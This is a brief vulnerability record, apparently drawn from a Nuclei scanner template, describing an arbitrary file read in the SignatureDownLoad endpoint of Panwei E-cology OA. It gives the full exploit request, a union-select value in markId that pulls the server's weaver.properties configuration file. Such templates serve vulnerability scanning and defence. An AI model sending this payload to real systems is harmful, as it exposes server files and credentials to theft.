# Vulnerability: OA E-Weaver SignatureDownLoad - Arbitrary File Read
**Classification:** ECOLOGY
**Source:** Nuclei Template (`weaver-signaturedownload-lfi.yaml`)

## Description
There is an arbitrary file reading vulnerability in the E-Weaver SignatureDownLoad interface of Panwei OA. An attacker can read any file on the server through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27
```

